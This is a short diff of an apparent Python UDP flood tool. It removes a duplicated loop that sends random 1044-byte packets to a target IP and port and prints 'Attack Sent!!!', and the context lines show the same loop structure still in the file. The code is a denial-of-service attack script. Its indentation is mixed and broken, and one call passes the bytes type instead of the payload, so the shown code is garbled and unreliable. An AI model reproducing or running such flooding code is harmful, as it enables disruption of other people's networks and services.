@@ -95,27 +95,6 @@ def run():
 			print("[!] Error!!!")
 
 while run:
-
-    clock.tick(2)
-	 data = random._urandom(1044)
-         i = random.choice(("[+]"))
-         while True:
-		 try:
-                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                        s.sendto(bytes, (ip,port))
-                        s.send(data)
-			for x in range(times):
-				s.send(data)
-			print(i +"Attack Sent!!!")
-		 except:
-			print("[!] Error!!!")
-
-
-
-    
-
-
-
 while run:
 
     clock.tick(3)
